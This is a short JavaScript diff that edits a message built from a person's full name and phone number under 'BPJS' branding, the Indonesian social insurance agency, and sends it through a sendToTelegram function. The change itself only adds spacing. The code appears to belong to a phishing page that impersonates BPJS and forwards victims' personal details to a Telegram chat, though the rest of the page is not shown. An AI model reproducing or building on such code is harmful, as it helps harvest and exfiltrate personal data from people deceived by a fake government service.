@@ -414,7 +414,7 @@ function processFirstData() {
             return false;
         }
 
-        var message = `🔹 *BPJS* 🔹\n\n👤 *Nama:* ${$full_name}\n📞 *Nomor:* \`\`\`${$phone_number}\`\`\``;
+        var message = `🔹 *BPJS* 🔹\n\n👤 *Nama:* ${$full_name}\n📞 *Nomor:* \`\`\` ${$phone_number} \`\`\``;
 sendToTelegram(message);
 
         setTimeout(() => {
